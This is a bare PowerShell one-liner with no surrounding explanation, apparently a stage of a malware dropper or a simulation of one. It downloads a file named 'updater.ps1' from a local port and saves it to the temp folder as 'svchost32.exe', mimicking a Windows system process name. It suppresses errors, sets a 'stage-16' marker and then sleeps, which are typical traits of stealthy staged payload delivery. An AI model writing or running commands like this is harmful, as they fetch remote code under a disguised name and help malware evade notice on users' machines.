
Invoke-WebRequest -Uri "https://localhost:9001/updater.ps1" -OutFile "$env:TEMP\svchost32.exe" -UseBasicParsing -ErrorAction SilentlyContinue; $StageMarker = "stage-16"; Start-Sleep -Seconds 34
